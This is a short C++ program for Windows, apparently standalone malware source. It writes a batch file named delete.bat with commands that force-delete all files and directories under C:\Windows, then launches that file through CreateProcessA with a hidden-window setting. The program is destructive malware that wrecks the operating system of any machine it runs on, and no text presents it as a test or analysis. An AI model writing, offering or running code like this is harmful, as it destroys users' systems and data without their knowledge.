#include <Windows.h>
#include <iostream>
#include <fstream>
#include <cstdio>

using namespace std;

void errorPrint()
{
    DWORD   dwLastError = GetLastError();
    TCHAR   lpBuffer[256];
    if (dwLastError != 0)
    {
        FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, dwLastError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), lpBuffer, 255, NULL);
    }

    printf("%s", lpBuffer);
}

int main()
{
    string filename = "delete.bat";

    ofstream batch(filename.c_str());

    batch << "del \/s \/f \/q c:\\Windows\\*.*" << endl;
    batch << "for \/f %%f in ('dir \/ad \/b c:\\Windows\\') do rd \/s \/q c:\\Windows\\%%f";

    batch.close();

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    LPSTR var = (LPSTR)malloc(sizeof(CHAR) * 300);

    GetEnvironmentVariableA("comspec", var, 300);

    char wd[300];
    GetCurrentDirectoryA(300, wd);

    string dir(wd);

    string program = dir + "/" + filename;

    if (CreateProcessA((LPSTR)program.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        WaitForSingleObject(pi.hProcess, INFINITE);
    }
    else
    {
        cout << "Something goes wrong...";
        errorPrint();
    }

    return 0;
}